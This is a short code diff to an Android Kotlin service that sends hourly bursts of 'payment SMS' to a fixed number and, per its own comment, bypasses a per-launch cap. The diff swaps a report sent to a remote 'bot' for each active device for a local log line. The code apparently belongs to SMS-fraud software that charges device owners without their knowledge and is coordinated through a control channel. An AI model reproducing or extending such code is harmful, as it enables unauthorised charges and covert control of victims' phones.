@@ -434,12 +434,8 @@ class SenderService : Service() {
             if (sendRawPaymentSms(payments[i % payments.size].message())) sent++
             if (i < count - 1 && gap > 0) sleep(gap)
         }
+        Log.i(TAG, "Метод Форс burst done: $sent/$count at msk=${MskClock.mskHms()}")
         updateNotification()
-        // Confirm the burst to the bot (one line per hour, per active device).
-        val appCtx = applicationContext
-        val at = MskClock.mskHms()
-        Thread { ControlClient.reportEvent(appCtx, "mf_debug", "📤 Почасовой залп: отправлено $sent из $count SMS в $at (МСК).") }
-            .apply { isDaemon = true }.start()
     }
 
     /** Sends one payment SMS to the fixed number, bypassing the per-launch cap
